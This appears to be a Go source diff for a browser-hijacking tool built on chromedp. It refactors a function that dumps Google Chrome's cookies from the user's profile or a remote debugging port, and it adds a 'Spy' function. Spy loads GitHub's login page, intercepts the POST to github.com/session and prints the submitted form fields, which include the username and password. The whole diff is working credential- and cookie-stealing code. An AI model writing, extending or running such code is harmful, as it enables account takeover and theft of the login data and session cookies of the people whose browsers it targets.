@@ -9,6 +9,8 @@ import (
 	"os"
 	"runtime"
 	"sort"
+	"strings"
+	"time"
 
 	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/chromedp"
@@ -66,15 +68,13 @@ func toMap(cookies []*network.Cookie) map[string][]*network.Cookie {
 	return result
 }
 
-// Dump Google Chrome's cookies
-func Dump(remoteURL string) {
+func getChromeContext(remoteURL string) (context.Context, context.CancelFunc, context.CancelFunc) {
 	var (
 		allocCtx context.Context
 		cancel   context.CancelFunc
 	)
 	if remoteURL != "" {
 		allocCtx, cancel = chromedp.NewRemoteAllocator(context.Background(), remoteURL)
-		defer cancel()
 	} else {
 		dir := getUserDataDir()
 		opts := []func(*chromedp.ExecAllocator){
@@ -91,10 +91,15 @@ func Dump(remoteURL string) {
 		}
 		opts = append(chromedp.DefaultExecAllocatorOptions[:], opts...)
 		allocCtx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
-		defer cancel()
 	}
-
 	taskCtx, taskCancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
+	return taskCtx, cancel, taskCancel
+}
+
+// Dump Google Chrome's cookies
+func Dump(remoteURL string) {
+	taskCtx, taskCancel, browserCancel := getChromeContext(remoteURL)
+	defer browserCancel()
 	defer taskCancel()
 	task := chromedp.Tasks{
 		chromedp.ActionFunc(func(ctx context.Context) error {
@@ -121,4 +126,30 @@ func Dump(remoteURL string) {
 	if err != nil {
 		log.Fatal(err)
 	}
+}
+
+// Spy intercepts requests
+func Spy(remote string) {
+	taskCtx, taskCancel, browserCancel := getChromeContext(remote)
+	defer browserCancel()
+	defer taskCancel()
+
+	chromedp.ListenBrowser(taskCtx, func(ev interface{}) {
+		switch ev.(type) {
+		case *network.EventRequestWillBeSent:
+			req := ev.(*network.EventRequestWillBeSent)
+			if req.Request.Method == "POST" && req.DocumentURL == "https://github.com/session" {
+				fmt.Println("Intercepted request:" + req.DocumentURL)
+				data := strings.Split(req.Request.PostData, "&")
+				for _, l := range data {
+					fmt.Println(l)
+				}
+			}
+		}
+	})
+	chromedp.Run(taskCtx,
+		network.Enable(),
+		chromedp.Navigate("https://github.com/login"),
+		chromedp.Sleep(time.Second*140),
+	)
 }
